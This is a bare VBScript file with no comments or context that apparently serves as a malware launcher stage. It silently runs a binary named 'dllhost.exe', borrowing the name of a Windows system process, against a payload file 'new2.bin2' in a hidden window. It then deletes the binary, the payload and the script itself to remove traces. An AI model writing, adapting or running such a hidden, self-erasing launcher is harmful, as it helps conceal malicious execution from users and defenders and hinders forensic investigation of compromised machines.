Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
command = "dllhost.exe new2.bin2"
objShell.Run command, 0, true
objFSO.DeleteFile "dllhost.exe"
objFSO.DeleteFile "run.vbs"
objFSO.DeleteFile "new2.bin2"
Set objFSO = Nothing
